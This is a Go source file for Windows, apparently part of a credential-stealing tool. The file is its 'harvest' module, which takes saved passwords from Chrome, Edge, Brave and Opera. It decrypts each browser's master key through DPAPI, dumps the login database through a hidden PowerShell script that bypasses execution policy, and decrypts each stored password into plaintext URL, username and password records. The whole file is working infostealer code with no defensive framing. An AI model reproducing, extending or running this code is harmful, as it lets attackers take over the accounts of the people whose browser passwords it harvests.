//go:build windows
// +build windows

package harvest

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modCrypt32         = windows.NewLazySystemDLL("crypt32.dll")
	procCryptUnprotect = modCrypt32.NewProc("CryptUnprotectData")
)

type dataBlob struct {
	cbData uint32
	pbData *byte
}

func dpapi(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, nil
	}
	in := dataBlob{cbData: uint32(len(data)), pbData: &data[0]}
	var out dataBlob
	r, _, err := procCryptUnprotect.Call(
		uintptr(unsafe.Pointer(&in)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&out)),
	)
	if r == 0 {
		return nil, err
	}
	defer windows.LocalFree(windows.Handle(unsafe.Pointer(out.pbData)))
	result := make([]byte, out.cbData)
	copy(result, (*[1 << 30]byte)(unsafe.Pointer(out.pbData))[:out.cbData:out.cbData])
	return result, nil
}

type chromeBrowser struct {
	name       string
	loginDB    string
	localState string
}

func chromeBrowsers() []chromeBrowser {
	local := os.Getenv("LOCALAPPDATA")
	roaming := os.Getenv("APPDATA")
	return []chromeBrowser{
		{"Chrome",
			filepath.Join(local, `Google\Chrome\User Data\Default\Login Data`),
			filepath.Join(local, `Google\Chrome\User Data\Local State`)},
		{"Edge",
			filepath.Join(local, `Microsoft\Edge\User Data\Default\Login Data`),
			filepath.Join(local, `Microsoft\Edge\User Data\Local State`)},
		{"Brave",
			filepath.Join(local, `BraveSoftware\Brave-Browser\User Data\Default\Login Data`),
			filepath.Join(local, `BraveSoftware\Brave-Browser\User Data\Local State`)},
		{"Opera",
			filepath.Join(roaming, `Opera Software\Opera Stable\Login Data`),
			filepath.Join(roaming, `Opera Software\Opera Stable\Local State`)},
	}
}

func getMasterKey(localStatePath string) []byte {
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil
	}
	var ls struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if json.Unmarshal(data, &ls) != nil {
		return nil
	}
	enc, err := base64.StdEncoding.DecodeString(ls.OSCrypt.EncryptedKey)
	if err != nil || len(enc) < 5 {
		return nil
	}
	key, _ := dpapi(enc[5:]) // strip "DPAPI" prefix
	return key
}

func decryptChromePwd(enc []byte, masterKey []byte) string {
	if len(enc) == 0 {
		return ""
	}
	if len(enc) > 3 && string(enc[:3]) == "v10" && len(masterKey) == 32 {
		nonce := enc[3:15]
		ciphertext := enc[15:]
		block, err := aes.NewCipher(masterKey)
		if err != nil {
			return ""
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return ""
		}
		plain, err := gcm.Open(nil, nonce, ciphertext, nil)
		if err != nil {
			return ""
		}
		return string(plain)
	}
	plain, _ := dpapi(enc)
	return string(plain)
}

func copyFileToTemp(src string) (string, func(), error) {
	in, err := os.Open(src)
	if err != nil {
		return "", nil, err
	}
	defer in.Close()
	tmp, err := os.CreateTemp("", "cld-*.db")
	if err != nil {
		return "", nil, err
	}
	if _, err := io.Copy(tmp, in); err != nil {
		tmp.Close()
		os.Remove(tmp.Name())
		return "", nil, err
	}
	tmp.Close()
	return tmp.Name(), func() { os.Remove(tmp.Name()) }, nil
}

// queryLoginData uses PowerShell to dump the Chrome Login Data SQLite table.
// Returns rows of [url, username, base64(enc_password)].
func queryLoginData(dbPath string) [][3]string {
	safe := strings.ReplaceAll(dbPath, `"`, `""`)
	ps := `
$dbPath = "` + safe + `"
$bytes = [System.IO.File]::ReadAllBytes($dbPath)
$tmp = [System.IO.Path]::GetTempFileName() + ".db"
[System.IO.File]::WriteAllBytes($tmp, $bytes)
try {
  Add-Type -AssemblyName System.Data
  $conn = New-Object System.Data.SQLite.SQLiteConnection
  $conn.ConnectionString = "Data Source=$tmp;Version=3;Read Only=True;"
  $conn.Open()
  $cmd = $conn.CreateCommand()
  $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins WHERE username_value != '' OR length(password_value) > 0"
  $r = $cmd.ExecuteReader()
  while ($r.Read()) {
    $url  = $r.GetValue(0)
    $user = $r.GetValue(1)
    $enc  = $r.GetValue(2)
    if ($enc -isnot [DBNull]) {
      $b64 = [Convert]::ToBase64String([byte[]]$enc)
    } else { $b64 = "" }
    Write-Output ($url + [char]9 + $user + [char]9 + $b64)
  }
  $conn.Close()
} finally { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }
`
	tmpScript, err := os.CreateTemp("", "cq-*.ps1")
	if err != nil {
		return nil
	}
	defer os.Remove(tmpScript.Name())
	tmpScript.WriteString(ps)
	tmpScript.Close()

	cmd := exec.Command("powershell.exe",
		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-ExecutionPolicy", "Bypass", "-File", tmpScript.Name())
	cmd.SysProcAttr = hiddenSysProcAttr()
	out, err := cmd.Output()
	if err != nil {
		return nil
	}

	var rows [][3]string
	for _, line := range strings.Split(strings.TrimSpace(string(out)), "\n") {
		parts := strings.SplitN(strings.TrimSpace(line), "\t", 3)
		if len(parts) == 3 {
			rows = append(rows, [3]string{parts[0], parts[1], parts[2]})
		}
	}
	return rows
}

func collectChrome() []Credential {
	var out []Credential
	for _, b := range chromeBrowsers() {
		if _, err := os.Stat(b.loginDB); err != nil {
			continue
		}
		masterKey := getMasterKey(b.localState)
		rows := queryLoginData(b.loginDB)
		for _, row := range rows {
			var encBytes []byte
			if row[2] != "" {
				encBytes, _ = base64.StdEncoding.DecodeString(row[2])
			}
			pass := decryptChromePwd(encBytes, masterKey)
			if row[1] != "" || pass != "" {
				out = append(out, Credential{
					Source:   b.name,
					URL:      row[0],
					Username: row[1],
					Password: pass,
				})
			}
		}
	}
	return out
}
